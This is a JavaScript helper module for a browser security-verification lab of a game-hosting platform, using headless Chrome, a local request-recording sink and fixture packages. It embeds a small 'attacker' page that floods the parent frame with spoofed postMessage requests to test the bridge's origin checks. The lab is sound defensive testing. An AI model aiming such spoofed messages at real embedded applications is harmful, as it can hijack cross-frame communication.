#!/usr/bin/env node
/**
 * M1 browser-verification lab (task-11 / A02 + A06).
 *
 * Shared machinery for the real-DSH + real-browser probes:
 *   - isolated `dsh web` host with this worktree's Host plugin injected
 *     (DSH_HOME under /tmp/dsh-v15, never ~/.dsh);
 *   - headless Chrome over CDP with **recursive** target auto-attach: the
 *     wrapper iframe (resource origin) and the nested game iframe are separate
 *     OOPIF targets, so network/log/console evidence needs a session per layer;
 *   - production Runtime loaded into the real DSH page as an ES module from a
 *     probe-served static copy of the repository (`packages/runtime/src/
 *     index.js` + its relative imports). This runs the real controller, real
 *     bridge and real SDK; it is not the bundled Client UI (documented as a
 *     limitation in m1-browser.md);
 *   - real `asset-zip-v2` packages built with tests/helpers/zip-package.mjs and
 *     installed through the real Host API (`POST /api/game-market/install-local`)
 *     and launched through the real `POST /api/game-market/launch`;
 *   - a sink origin that records every HTTP request and WebSocket upgrade
 *     (A06 external-egress assertions) and a static repo origin (Runtime module
 *     + unprivileged attacker page).
 *
 * Every helper is defensive: probes record what happened instead of throwing,
 * so one failed layer still leaves reviewable evidence for the rest.
 */
import http from 'node:http';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

import {
  ensureRuntime,
  runtimeIdentity,
  makeHome,
  startHost,
  injectProbeRow,
  removeProbeRow,
  Cdp,
  sleep,
  writeJson,
  sanitizeDeep,
  createReport,
  WORK,
} from '../../lib/harness.mjs';
import { buildPackage } from '../../../../../tests/helpers/zip-package.mjs';

const HERE = path.dirname(fileURLToPath(import.meta.url));
export const M1_DIR = path.resolve(HERE, '..');
export const V15_DIR = path.resolve(HERE, '../..');
export const REPO_ROOT = path.resolve(HERE, '../../../../..');
export const OUT_DIR = path.join(REPO_ROOT, 'docs/verification/v1.5/raw/m1');
export const SHOT_DIR = path.join(OUT_DIR, 'screenshots');
export const FIXTURE_ASSET_DIR = path.join(REPO_ROOT, 'scripts/verification/v1.5/assets/fixture-package/assets');

export { ensureRuntime, runtimeIdentity, Cdp, sleep, writeJson, sanitizeDeep, createReport, WORK };

// ---------------------------------------------------------------------------
// Redaction (evidence may never contain live credentials or user paths)
// ---------------------------------------------------------------------------

const ID_RE = /[a-f0-9]{32}/g;

/** HTML-escape an attribute value placed into a probe-built document. */
export function escapeHtml(value) {
  return String(value).replaceAll('&', '&amp;').replaceAll('<', '&lt;').replaceAll('>', '&gt;').replaceAll('"', '&quot;');
}

/** Redact every live credential shape the probes can observe. */
export function redact(value, secrets = []) {
  if (typeof value === 'string') {
    let out = value
      .replace(/\/res\/[a-f0-9]{32}\/[a-f0-9]{32}\//g, '/res/<instance>/<token>/')
      .replace(/([?&])launch=[^&\s"']+/g, '$1launch=<redacted>')
      .replace(/([?&])instance=[a-f0-9]{32}/g, '$1instance=<instance>')
      .replace(/([?&])nonce=[a-f0-9]{32}/g, '$1nonce=<launch-nonce>')
      .replace(/([?&])token=[^&\s"']+/g, '$1token=<redacted>')
      .replace(/src=[A-Za-z0-9%._~!$&'()*+,;=:@/?#-]+/g, 'src=<redacted-src>')
      .replace(ID_RE, '<credential>')
      .replace(/\/Users\/[^/\s"']+/g, '/Users/<user>');
    for (const secret of secrets) {
      if (typeof secret === 'string' && secret.length >= 8) out = out.split(secret).join('<credential>');
    }
    return out;
  }
  if (Array.isArray(value)) return value.map((item) => redact(item, secrets));
  if (value && typeof value === 'object') {
    return Object.fromEntries(Object.entries(value).map(([key, item]) => [key, redact(item, secrets)]));
  }
  return value;
}

export function sanitiseForEvidence(value, secrets = []) {
  return redact(sanitizeDeep(value), secrets);
}

// ---------------------------------------------------------------------------
// CDP capture with recursive auto-attach (wrapper -> game OOPIF chain)
// ---------------------------------------------------------------------------

export function createCdpCapture(cdp) {
  const state = {
    attached: [],
    detached: [],
    byTarget: new Map(),
    sessions: new Map(),
    network: new Map(),
    networkOrder: [],
    logs: [],
    console: [],
    exceptions: [],
    contexts: [],
    fetchBlocked: [],
    fetchContinued: [],
    fileChoosers: [],
    gates: new Map(),
    defaultGate: null,
    pausedTargets: [],
  };

  async function enableSession(sessionId, waitingForDebugger) {
    await Promise.allSettled([
      cdp.send('Network.enable', {}, sessionId),
      cdp.send('Log.enable', {}, sessionId),
      cdp.send('Runtime.enable', {}, sessionId),
      cdp.send('Page.enable', {}, sessionId),
    ]);
    // Descendants of this target (the nested game iframe inside the wrapper)
    // need their own auto-attach switch.
    await cdp.send('Target.setAutoAttach', { autoAttach: true, waitForDebuggerOnStart: true, flatten: true }, sessionId).catch(() => {});
    if (state.defaultGate) await enableFetchFor(sessionId, state.defaultGate);
    if (waitingForDebugger) await cdp.send('Runtime.runIfWaitingForDebugger', {}, sessionId).catch(() => {});
  }

  async function enableFetchFor(sessionId, gate) {
    state.gates.set(sessionId, gate);
    await cdp.send('Fetch.enable', { patterns: [{ urlPattern: '*', requestStage: 'Request' }] }, sessionId).catch(() => {});
  }

  function handleMessage(message) {
    const sessionId = message.sessionId || null;
    const params = message.params || {};
    switch (message.method) {
      case 'Target.attachedToTarget': {
        const info = params.targetInfo || {};
        const record = {
          sessionId: params.sessionId,
          targetId: info.targetId,
          type: info.type,
          url: info.url || '',
          attachedAt: Date.now(),
        };
        state.attached.push(record);
        state.sessions.set(params.sessionId, record);
        if (info.targetId) state.byTarget.set(info.targetId, record);
        if (params.waitingForDebugger) state.pausedTargets.push(params.sessionId);
        void enableSession(params.sessionId, params.waitingForDebugger === true);
        return;
      }
      case 'Target.targetInfoChanged': {
        const info = params.targetInfo || {};
        const record = state.byTarget.get(info.targetId);
        if (record) record.url = info.url || record.url;
        return;
      }
      case 'Target.detachedFromTarget': {
        const record = state.sessions.get(params.sessionId);
        if (record) record.detachedAt = Date.now();
        state.detached.push({ sessionId: params.sessionId, at: Date.now() });
        state.sessions.delete(params.sessionId);
        return;
      }
      case 'Runtime.executionContextCreated':
        state.contexts.push({ sessionId, context: params.context });
        return;
      case 'Network.requestWillBeSent': {
        const value = {
          sessionId,
          requestId: params.requestId,
          url: params.request && params.request.url,
          method: params.request && params.request.method,
          resourceType: params.type,
          at: Date.now(),
          initiator: params.initiator && params.initiator.type,
          requestHeaders: (params.request && params.request.headers) || null,
          postData: params.request && typeof params.request.postData === 'string' ? params.request.postData : null,
          postDataEntries: (params.request && Array.isArray(params.request.postDataEntries)) ? params.request.postDataEntries : null,
        };
        state.network.set(`${sessionId}:${params.requestId}`, value);
        state.networkOrder.push(value);
        return;
      }
      case 'Network.requestWillBeSentExtraInfo': {
        const value = state.network.get(`${sessionId}:${params.requestId}`);
        if (value) value.actualRequestHeaders = params.headers || null;
        return;
      }
      case 'Network.responseReceived': {
        const value = state.network.get(`${sessionId}:${params.requestId}`);
        if (value) {
          value.status = params.response && params.response.status;
          value.mimeType = params.response && params.response.mimeType;
          value.responseHeaders = (params.response && params.response.headers) || null;
          value.fromDiskCache = Boolean(params.response && params.response.fromDiskCache);
        }
        return;
      }
      case 'Network.loadingFailed': {
        let value = state.network.get(`${sessionId}:${params.requestId}`);
        if (!value) {
          value = { sessionId, requestId: params.requestId, url: null, resourceType: params.type, at: Date.now() };
          state.network.set(`${sessionId}:${params.requestId}`, value);
          state.networkOrder.push(value);
        }
        value.failed = true;
        value.errorText = params.errorText;
        value.blockedReason = params.blockedReason || null;
        value.canceled = params.canceled === true;
        return;
      }
      case 'Fetch.requestPaused': {
        void (async () => {
          const gate = state.gates.get(sessionId) || null;
          const url = (params.request && params.request.url) || '';
          try {
            if (gate && gate.allowPrefix && url.startsWith(gate.allowPrefix)) {
              await cdp.send('Fetch.continueRequest', { requestId: params.requestId }, sessionId);
              state.fetchContinued.push({ sessionId, url, at: Date.now() });
            } else if (gate) {
              await cdp.send('Fetch.failRequest', { requestId: params.requestId, errorReason: 'BlockedByClient' }, sessionId);
              state.fetchBlocked.push({ sessionId, url, at: Date.now(), reason: 'blocked-non-resource-origin' });
            } else {
              await cdp.send('Fetch.continueRequest', { requestId: params.requestId }, sessionId);
            }
          } catch (_error) {
            // Target may have gone away while paused.
          }
        })();
        return;
      }
      case 'Log.entryAdded': {
        const entry = params.entry || {};
        state.logs.push({
          sessionId,
          at: Date.now(),
          level: entry.level,
          source: entry.source,
          text: String(entry.text || '').slice(0, 500),
          url: entry.url || null,
        });
        return;
      }
      case 'Runtime.consoleAPICalled': {
        state.console.push({
          sessionId,
          at: Date.now(),
          type: params.type,
          text: (params.args || []).map((arg) => arg.value ?? arg.description ?? '').join(' ').slice(0, 1000),
        });
        return;
      }
      case 'Runtime.exceptionThrown': {
        const details = params.exceptionDetails || {};
        state.exceptions.push({
          sessionId,
          at: Date.now(),
          text: String(((details.exception && details.exception.description) || details.text || '')).slice(0, 500),
        });
        return;
      }
      case 'Page.fileChooserOpened': {
        state.fileChoosers.push({
          sessionId,
          at: Date.now(),
          backendNodeId: params.backendNodeId,
          mode: params.mode || null,
          frameId: params.frameId || null,
        });
        return;
      }
      default:
        return;
    }
  }

  const originalOnMessage = cdp.ws.onmessage;
  cdp.ws.onmessage = (event) => {
    originalOnMessage(event);
    let message;
    try {
      message = JSON.parse(event.data);
    } catch (_error) {
      return;
    }
    handleMessage(message);
  };

  return {
    state,
    async start() {
      await cdp.send('Target.setAutoAttach', { autoAttach: true, waitForDebuggerOnStart: true, flatten: true });
      await cdp.send('Network.enable').catch(() => {});
      await cdp.send('Log.enable').catch(() => {});
    },
    /**
     * Evaluate inside a frame of the ROOT target via an isolated world.
     * Needed for the wrapper frame: it is cross-origin to the DSH page but
     * same-site (different loopback port), so after the P0 fix it is NOT an
     * OOPIF target and has no session of its own.
     */
    async evaluateInFrame(urlIncludes, expression) {
      const tree = await cdp.send('Page.getFrameTree');
      const findFrame = (node) => {
        if (!node || !node.frame) return null;
        if (typeof node.frame.url === 'string' && node.frame.url.includes(urlIncludes)) return node.frame;
        for (const child of node.childFrames || []) {
          const found = findFrame(child);
          if (found) return found;
        }
        return null;
      };
      const frame = findFrame(tree && tree.frameTree);
      if (!frame) return { frameFound: false, frameUrl: null, value: null };
      const world = await cdp.send('Page.createIsolatedWorld', { frameId: frame.id, worldName: 'm1-probe', grantUniveralAccess: true });
      const contextId = world && world.executionContextId;
      if (!contextId) return { frameFound: true, frameId: frame.id, frameUrl: frame.url, value: null, error: 'no-execution-context' };
      const result = await cdp.send('Runtime.evaluate', { expression, contextId, returnByValue: true, awaitPromise: true });
      if (result && result.exceptionDetails) {
        return { frameFound: true, frameId: frame.id, frameUrl: frame.url, value: null, error: String(((result.exceptionDetails.exception || {}).description) || result.exceptionDetails.text).slice(0, 300) };
      }
      return { frameFound: true, frameId: frame.id, frameUrl: frame.url, value: result && result.result ? result.result.value : null };
    },
    async frameTree() {
      const tree = await cdp.send('Page.getFrameTree');
      const flatten = (node, depth = 0) => {
        if (!node || !node.frame) return [];
        const row = { depth, id: node.frame.id, url: node.frame.url, securityOrigin: node.frame.securityOrigin || null, mimeType: node.frame.mimeType || null };
        return [row, ...(node.childFrames || []).flatMap((child) => flatten(child, depth + 1))];
      };
      return flatten(tree && tree.frameTree);
    },
    async evaluate(sessionId, expression) {
      const result = await cdp.send(
        'Runtime.evaluate',
        { expression, returnByValue: true, awaitPromise: true },
        sessionId
      );
      if (result && result.exceptionDetails) {
        const text = (result.exceptionDetails.exception || {}).description || result.exceptionDetails.text;
        throw new Error(`session evaluate failed: ${String(text).slice(0, 300)}`);
      }
      return result && result.result ? result.result.value : null;
    },
    iframeSessions() {
      return state.attached.filter((record) => record.type === 'iframe');
    },
    wrapperSessions() {
      return state.attached.filter(
        (record) => record.type === 'iframe' && typeof record.url === 'string' && record.url.includes('/wrapper?')
      );
    },
    gameSessions() {
      return state.attached.filter(
        (record) =>
          record.type === 'iframe' &&
          typeof record.url === 'string' &&
          record.url.includes('/res/') &&
          !record.url.includes('/wrapper?')
      );
    },
    async waitForSession(predicate, timeoutMs = 15000, stepMs = 150) {
      const started = Date.now();
      while (Date.now() - started < timeoutMs) {
        const match = state.attached.find((record) => record.type === 'iframe' && predicate(record));
        if (match) return match;
        await sleep(stepMs);
      }
      return null;
    },
    async waitForGameRendered(timeoutMs = 20000, stepMs = 300) {
      const started = Date.now();
      while (Date.now() - started < timeoutMs) {
        for (const session of state.attached.filter((record) => record.type === 'iframe')) {
          try {
            const snapshot = await this.evaluate(
              session.sessionId,
              `(() => ({
                href: location.href,
                origin: window.origin,
                title: document.title || '',
                hasHud: Boolean(document.getElementById('hud')),
                hasBoard: Boolean(document.getElementById('board')),
                game: window.__M1_GAME__ ? { phase: window.__M1_GAME__.phase, ticks: window.__M1_GAME__.ticks } : null,
                evil: window.__M1_EVIL__ ? { phase: window.__M1_EVIL__.phase } : null,
                chromeError: location.href.startsWith('chrome-error:')
              }))()`
            );
            if (snapshot && (snapshot.game || snapshot.evil || snapshot.chromeError)) {
              return { sessionId: session.sessionId, snapshot };
            }
          } catch (_error) {
            // Navigation in flight / target gone.
          }
        }
        await sleep(stepMs);
      }
      return null;
    },
    async enableFetch(sessionId, gate) {
      await enableFetchFor(sessionId, gate);
    },
    async setDefaultGate(gate) {
      state.defaultGate = gate;
      for (const record of state.attached) {
        if (record.type !== 'iframe') continue;
        if (gate) {
          if (!state.gates.has(record.sessionId)) await enableFetchFor(record.sessionId, gate);
        } else if (state.gates.has(record.sessionId)) {
          state.gates.delete(record.sessionId);
          await cdp.send('Fetch.disable', {}, record.sessionId).catch(() => {});
        }
      }
    },
    networkFor(sessionId) {
      return state.networkOrder.filter((entry) => entry.sessionId === sessionId);
    },
    /** Response body for a captured request as text (JSON/text responses). */
    async responseBody(entry) {
      if (!entry || typeof entry.requestId !== 'string' || entry.failed === true) return null;
      const result = await cdp
        .send('Network.getResponseBody', { requestId: entry.requestId }, entry.sessionId || undefined)
        .catch(() => null);
      if (!result) return null;
      if (result.base64Encoded === true) return null;
      return typeof result.body === 'string' ? result.body : null;
    },
    /** Raw request body for a captured request (text bodies only; null otherwise). */
    async requestPostData(entry) {
      if (!entry || typeof entry.requestId !== 'string') return null;
      const result = await cdp
        .send('Network.getRequestPostData', { requestId: entry.requestId }, entry.sessionId || undefined)
        .catch(() => null);
      return result && typeof result.postData === 'string' ? result.postData : null;
    },
    /** Wait for the next native file-chooser event after a real click. */
    async waitForFileChooser(sinceIndex = state.fileChoosers.length, timeoutMs = 8000) {
      const deadline = Date.now() + timeoutMs;
      while (Date.now() < deadline) {
        const found = state.fileChoosers.slice(sinceIndex)[0];
        if (found) return found;
        await sleep(100);
      }
      return null;
    },
    logsFor(sessionId) {
      return state.logs.filter((entry) => entry.sessionId === sessionId);
    },
    consoleFor(sessionId) {
      return state.console.filter((entry) => entry.sessionId === sessionId);
    },
    parsedConsole(sessionId, prefix = 'M1P ') {
      const out = [];
      for (const entry of state.console.filter((item) => item.sessionId === sessionId)) {
        if (typeof entry.text !== 'string' || !entry.text.startsWith(prefix)) continue;
        try {
          out.push(JSON.parse(entry.text.slice(prefix.length)));
        } catch (_error) {
          out.push({ unparsed: entry.text.slice(0, 300) });
        }
      }
      return out;
    },
    counters() {
      return {
        network: state.networkOrder.length,
        logs: state.logs.length,
        console: state.console.length,
        exceptions: state.exceptions.length,
      };
    },
    slice(counters) {
      return {
        network: state.networkOrder.slice(counters.network),
        logs: state.logs.slice(counters.logs),
        console: state.console.slice(counters.console),
        exceptions: state.exceptions.slice(counters.exceptions),
      };
    },
  };
}

// ---------------------------------------------------------------------------
// Auxiliary origins: static repo + sink
// ---------------------------------------------------------------------------

const MIME_BY_EXT = Object.freeze({
  '.js': 'text/javascript; charset=utf-8',
  '.mjs': 'text/javascript; charset=utf-8',
  '.json': 'application/json; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.html': 'text/html; charset=utf-8',
  '.svg': 'image/svg+xml',
  '.png': 'image/png',
  '.wav': 'audio/wav',
});

const ATTACKER_PAGE = `<!doctype html>
<html><head><meta charset="utf-8"><title>attacker</title></head>
<body>
<script>
  (function () {
    var params = new URLSearchParams(location.search);
    var count = Number(params.get('count') || 1);
    var delay = Number(params.get('delay') || 250);
    var received = [];
    window.addEventListener('message', function (event) {
      try { received.push({ origin: String(event.origin), data: event.data && event.data.kind }); } catch (e) { /* ignore */ }
    });
    window.__ATTACKER__ = { posted: 0, count: count, received: received };
    setTimeout(function () {
      for (var i = 0; i < count; i += 1) {
        try {
          parent.postMessage({ v: 1, kind: 'req', id: 'spoof-' + i, method: 'ready', params: { protocolVersion: 1 }, attacker: true }, '*');
          window.__ATTACKER__.posted += 1;
        } catch (e) { /* ignore */ }
      }
      console.log('M1P_ATTACKER ' + JSON.stringify({ posted: window.__ATTACKER__.posted, received: received.length, count: count }));
    }, delay);
  })();
</script>
</body></html>`;


/** Static origin serving this repository tree (ESM runtime modules + attacker page). */
export function createStaticOrigin({ port = 58331 } = {}) {
  let server = null;
  let actualPort = null;
  const log = [];
  const origin = () => `http://127.0.0.1:${actualPort}`;
  function serveFile(res, file) {
    let bytes;
    try {
      bytes = fs.readFileSync(file);
    } catch (_error) {
      res.writeHead(404, { 'content-type': 'text/plain; charset=utf-8', 'access-control-allow-origin': '*' });
      res.end('not found');
      return;
    }
    const ext = path.extname(file).toLowerCase();
    res.writeHead(200, {
      'content-type': MIME_BY_EXT[ext] || 'application/octet-stream',
      'content-length': String(bytes.length),
      'cache-control': 'no-store',
      'access-control-allow-origin': '*',
      'x-content-type-options': 'nosniff',
    });
    res.end(bytes);
  }
  const handler = (req, res) => {
    let url;
    try {
      url = new URL(req.url, origin());
    } catch (_error) {
      req.destroy();
      return;
    }
    log.push({ method: req.method, path: url.pathname });
    if (url.pathname === '/probe/attacker.html') {
      const bytes = Buffer.from(ATTACKER_PAGE, 'utf8');
      res.writeHead(200, {
        'content-type': 'text/html; charset=utf-8',
        'content-length': String(bytes.length),
        'cache-control': 'no-store',
        'access-control-allow-origin': '*',
      });
      res.end(bytes);
      return;
    }
    const rel = url.pathname.replace(/^\/+/, '');
    const target = path.resolve(REPO_ROOT, rel);
    if (target !== REPO_ROOT && !target.startsWith(`${REPO_ROOT}${path.sep}`)) {
      res.writeHead(403, { 'content-type': 'text/plain; charset=utf-8' });
      res.end('forbidden');
      return;
    }
    serveFile(res, target);
  };
  return {
    start: () =>
      new Promise((resolve, reject) => {
        server = http.createServer(handler);
        server.on('error', reject);
        server.listen(port, '127.0.0.1', () => {
          actualPort = server.address().port;
          resolve({ port: actualPort, origin: origin() });
        });
      }),
    stop: () =>
      new Promise((resolve) => {
        if (!server) return resolve();
        const closing = server;
        server = null;
        closing.close(() => resolve());
      }),
    requestLog: () => log.slice(),
    get origin() {
      return origin();
    },
  };
}

/** Sink origin: records every HTTP request and WebSocket upgrade. */
export function createSinkOrigin({ port = 58332 } = {}) {
  let server = null;
  let actualPort = null;
  const requests = [];
  const upgrades = [];
  const origin = () => `http://127.0.0.1:${actualPort}`;
  const wsOrigin = () => `ws://127.0.0.1:${actualPort}`;
  const handler = (req, res) => {
    let url;
    try {
      url = new URL(req.url, origin());
    } catch (_error) {
      req.destroy();
      return;
    }
    const record = {
      at: Date.now(),
      method: req.method,
      path: url.pathname,
      search: url.search,
      origin: req.headers.origin ?? null,
      secFetchSite: req.headers['sec-fetch-site'] ?? null,
      referer: req.headers.referer ?? null,
    };
    requests.push(record);
    let body = '';
    req.on('data', (chunk) => {
      body += chunk;
      if (body.length > 8192) req.destroy();
    });
    req.on('end', () => {
      record.bodyPrefix = body.slice(0, 200);
      res.writeHead(200, { 'content-type': 'text/plain; charset=utf-8', 'cache-control': 'no-store' });
      res.end('sink-ok');
    });
  };
  return {
    start: () =>
      new Promise((resolve, reject) => {
        server = http.createServer(handler);
        server.on('upgrade', (req, socket) => {
          upgrades.push({ at: Date.now(), url: req.url, headers: { origin: req.headers.origin ?? null } });
          socket.destroy();
        });
        server.on('error', reject);
        server.listen(port, '127.0.0.1', () => {
          actualPort = server.address().port;
          resolve({ port: actualPort, origin: origin(), wsOrigin: wsOrigin() });
        });
      }),
    stop: () =>
      new Promise((resolve) => {
        if (!server) return resolve();
        const closing = server;
        server = null;
        closing.close(() => resolve());
      }),
    reset() {
      requests.length = 0;
      upgrades.length = 0;
    },
    requests: () => requests.slice(),
    upgrades: () => upgrades.slice(),
    get origin() {
      return origin();
    },
    get wsOrigin() {
      return wsOrigin();
    },
  };
}

// ---------------------------------------------------------------------------
// Isolated host
// ---------------------------------------------------------------------------

/**
 * Boot an isolated `dsh web` host with this worktree's Host plugin injected.
 * Returns the host handle plus the DSH web origin; caller owns cleanup.
 */
export async function startIsolatedHost({ name, ports, pluginRoot = REPO_ROOT }) {
  ensureRuntime();
  const home = await makeHome(name, { port: ports.bootstrap });
  if (!home.startsWith(WORK) || home.includes('/.dsh')) {
    throw new Error(`refusing non-isolated DSH_HOME: ${home}`);
  }
  const patchPath = injectProbeRow(home, {
    id: 'dsh-game-market',
    entry: path.join(pluginRoot, 'index.js'),
    config: { devMode: true },
  });
  const host = await startHost(home, { port: ports.host, logName: `${name}-host` });
  return {
    home,
    host,
    patchPath,
    hostOrigin: `http://127.0.0.1:${ports.host}`,
    async stop() {
      try {
        removeProbeRow(home, 'dsh-game-market');
      } catch (_error) {
        // ignore
      }
      await host.stop();
    },
    async cleanup() {
      await this.stop();
      fs.rmSync(home, { recursive: true, force: true });
    },
  };
}

// ---------------------------------------------------------------------------
// Page-side helpers
// ---------------------------------------------------------------------------

/** Wait until the real DSH page is usable and the Host plugin answers. */
export async function waitForDshPage(cdp, hostOrigin, { timeoutMs = 40000 } = {}) {
  const started = Date.now();
  let last = null;
  while (Date.now() - started < timeoutMs) {
    try {
      last = await cdp.eval(`(() => ({
        ready: document.readyState,
        origin: location.origin,
        hasBody: Boolean(document.body)
      }))()`);
      if (last && last.ready === 'complete' && last.hasBody) break;
    } catch (_error) {
      last = { error: String(_error && _error.message) };
    }
    await sleep(400);
  }
  let health = null;
  while (Date.now() - started < timeoutMs + 5000) {
    try {
      health = await cdp.eval(
        `fetch('/api/game-market/health').then(async (response) => ({ status: response.status, body: await response.json() })).catch((error) => ({ error: String(error) }))`
      );
      if (health && health.status === 200) break;
    } catch (_error) {
      health = { error: String(_error) };
    }
    await sleep(400);
  }
  return { page: last, health, hostOrigin };
}

/** POST a raw ZIP to the real local install route (authenticated same-origin page fetch). */
export async function installZipFromPage(cdp, zip, { operationId, contentType = 'application/zip' }) {
  const base64 = Buffer.from(zip).toString('base64');
  return cdp.eval(`(async () => {
    const bytes = Uint8Array.from(atob(${JSON.stringify(base64)}), (c) => c.charCodeAt(0));
    const response = await fetch('/api/game-market/install-local?operationId=' + encodeURIComponent(${JSON.stringify(operationId)}), {
      method: 'POST',
      headers: { 'content-type': ${JSON.stringify(contentType)} },
      body: bytes
    });
    return { status: response.status, body: await response.json().catch(() => null) };
  })()`);
}

/** Call the real launch route from the authenticated page. */
export async function launchFromPage(cdp, { gameId, dshSessionId = 'probe-m1-session', mode = 'start' }) {
  return cdp.eval(
    `fetch('/api/game-market/launch', {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ gameId: ${JSON.stringify(gameId)}, mode: ${JSON.stringify(mode)}, dshSessionId: ${JSON.stringify(dshSessionId)} })
    }).then(async (response) => ({ status: response.status, body: await response.json().catch(() => null) })).catch((error) => ({ error: String(error) }))`
  );
}

/** Same-origin GET from the page (positive controls for Host API reachability). */
export async function pageFetchJson(cdp, requestPath) {
  return cdp.eval(
    `fetch(${JSON.stringify(requestPath)}, { cache: 'no-store' }).then(async (response) => ({ status: response.status, body: await response.text() })).catch((error) => ({ error: String(error) }))`
  );
}

/**
 * Install the production Runtime into the real DSH page (ES module loaded from
 * the probe static origin) with a real Host-API-backed `api` stub and a visible
 * container. This is the system under test for the runtime-level assertions.
 */
export async function setupRuntimeLab(cdp, { staticOrigin }) {
  const runtimeUrl = `${staticOrigin}/packages/runtime/src/index.js`;
  return cdp.eval(`(async () => {
    if (window.__M1_LAB__ && window.__M1_LAB__.runtime) {
      try { window.__M1_LAB__.runtime.destroy(); } catch (error) { /* ignore */ }
    }
    const existing = document.getElementById('m1-runtime-container');
    if (existing) existing.remove();
    const module = await import(${JSON.stringify(runtimeUrl)});
    const container = document.createElement('div');
    container.id = 'm1-runtime-container';
    container.style.cssText = 'position:fixed;left:24px;top:96px;width:900px;height:580px;border:2px solid #37b;border-radius:8px;overflow:hidden;background:#000;z-index:2147483000;box-shadow:0 8px 30px rgba(0,0,0,.45)';
    document.body.appendChild(container);
    const events = [];
    const toData = async (response) => {
      const body = await response.json().catch(() => null);
      if (!body || body.ok !== true) {
        const error = (body && body.error) || { code: 'GM-5000', message: 'probe api call failed' };
        const thrown = new Error(error.message || 'probe api call failed');
        thrown.code = error.code;
        thrown.retryable = error.retryable === true;
        throw thrown;
      }
      return body.data;
    };
    const json = (method, requestPath, payload) => fetch(requestPath, {
      method,
      headers: { 'content-type': 'application/json' },
      body: payload === undefined ? undefined : JSON.stringify(payload)
    });
    const api = {
      setSave: async (payload) => toData(await json('POST', '/api/game-market/save', payload)),
      getSave: async (gameId, options) => toData(await fetch('/api/game-market/save?gameId=' + encodeURIComponent(gameId) + '&include=' + (options && options.includeData ? 'data' : 'meta'))),
      removeSave: async (payload) => toData(await json('POST', '/api/game-market/save-remove', payload)),
      startSession: async (payload) => toData(await json('POST', '/api/game-market/session', { action: 'start', ...payload })),
      endSession: async (payload) => toData(await json('POST', '/api/game-market/session', { action: 'end', ...payload })),
      submitScore: async (payload) => toData(await json('POST', '/api/game-market/score', payload)),
      getScores: async (gameId) => toData(await fetch('/api/game-market/scores?gameId=' + encodeURIComponent(gameId))),
      releaseRuntime: async (payload) => json('POST', '/api/game-market/runtime-release', payload).then(() => ({ released: 1 })).catch(() => ({ released: 0 }))
    };
    const runtime = module.createGameRuntime({
      container,
      api,
      environment: { theme: 'light', reducedMotion: false, locale: 'zh' },
      onEvent: (event) => {
        events.push({
          at: Date.now(),
          type: event.type,
          state: event.state,
          reason: event.reason,
          error: event.error ? { code: event.error.code, message: event.error.message, retryable: event.error.retryable } : null
        });
      }
    });
    window.__M1_LAB__ = {
      runtime,
      events,
      container,
      launch: async (info) => { window.__M1_LAB__.launchInfo = info; await runtime.launch(info); return true; },
      reload: () => runtime.reload(),
      destroy: () => runtime.destroy(),
      state: () => runtime.getState(),
      eventLog: () => events,
      frameInfo: () => {
        const frame = container.querySelector('iframe');
        return frame ? {
          sandbox: frame.getAttribute('sandbox'),
          allow: frame.getAttribute('allow'),
          referrerpolicy: frame.getAttribute('referrerpolicy'),
          src: frame.getAttribute('src')
        } : null;
      }
    };
    return { ok: true, runtimeUrl: ${JSON.stringify(runtimeUrl)} };
  })()`);
}

export async function runtimeLaunch(cdp, launchInfo) {
  return cdp.eval(`window.__M1_LAB__.launch(${JSON.stringify(launchInfo)})`);
}

export async function runtimeReload(cdp) {
  return cdp.eval(`window.__M1_LAB__.reload()`);
}

export async function runtimeDestroy(cdp) {
  return cdp.eval(`(() => { try { window.__M1_LAB__.runtime.destroy(); } catch (error) { window.__M1_LAB__.destroyError = String(error); } return true; })()`);
}

export async function runtimeState(cdp) {
  return cdp.eval(`({ state: window.__M1_LAB__.state(), frame: window.__M1_LAB__.frameInfo(), events: window.__M1_LAB__.eventLog() })`);
}

/**
 * Embed the platform wrapper directly, WITHOUT the Runtime (diagnostic mode).
 * The wrapper iframe is created exactly as the decided M1 model says the Runtime
 * must create it: no `sandbox` attribute, `allow=autoplay`,
 * `referrerpolicy=no-referrer`.
 */
export async function embedWrapperDiagnostic(cdp, { wrapperUrl, id = 'm1-diag-frame' }) {
  return cdp.eval(`(() => {
    const existing = document.getElementById(${JSON.stringify(id)});
    if (existing) existing.remove();
    const frame = document.createElement('iframe');
    frame.id = ${JSON.stringify(id)};
    frame.setAttribute('allow', 'autoplay');
    frame.setAttribute('referrerpolicy', 'no-referrer');
    frame.src = ${JSON.stringify(wrapperUrl)};
    frame.style.cssText = 'position:fixed;left:24px;top:96px;width:900px;height:580px;border:2px solid #b73;border-radius:8px;overflow:hidden;background:#000;z-index:2147483000;box-shadow:0 8px 30px rgba(0,0,0,.45)';
    document.body.appendChild(frame);
    const rect = frame.getBoundingClientRect();
    return { left: rect.left, top: rect.top, width: rect.width, height: rect.height, sandbox: frame.getAttribute('sandbox') };
  })()`);
}

export async function removeProbeFrames(cdp) {
  return cdp.eval(`(() => {
    for (const id of ['m1-runtime-container', 'm1-diag-frame']) {
      const node = document.getElementById(id);
      if (node) node.remove();
    }
    return true;
  })()`).catch(() => null);
}

/** Screenshot clipped to a DOM rect (or the full page). */
export async function screenshot(cdp, name, clip = null) {
  fs.mkdirSync(SHOT_DIR, { recursive: true });
  const file = path.join(SHOT_DIR, `${name}.png`);
  await cdp.shot(file, clip ? { clip } : {});
  return path.relative(REPO_ROOT, file);
}

// ---------------------------------------------------------------------------
// Game package builders (real `asset-zip-v2` fixtures)
// ---------------------------------------------------------------------------

const ASSET_SHIP_PNG = () => fs.readFileSync(path.join(FIXTURE_ASSET_DIR, 'ship.png'));
const ASSET_PICKUP_WAV = () => fs.readFileSync(path.join(FIXTURE_ASSET_DIR, 'pickup.wav'));

/** Compile the production SDK into the single `dsh-sdk.js` a zip package ships. */
export async function buildSdkFile() {
  const { bundleExpression } = await import('../../../../bundle-lib.mjs');
  const expression = bundleExpression({
    entry: path.join(REPO_ROOT, 'packages/sdk/src/sdk.js'),
    root: REPO_ROOT,
  });
  return Buffer.from(
    `/* Generated by scripts/verification/v1.5/m1/lib/lab.mjs from packages/sdk/src/sdk.js — do not edit. */\n` +
      `globalThis.DSH_GAME_SDK = ${expression};\n`,
    'utf8'
  );
}

function buildPackageFiles(fileMap) {
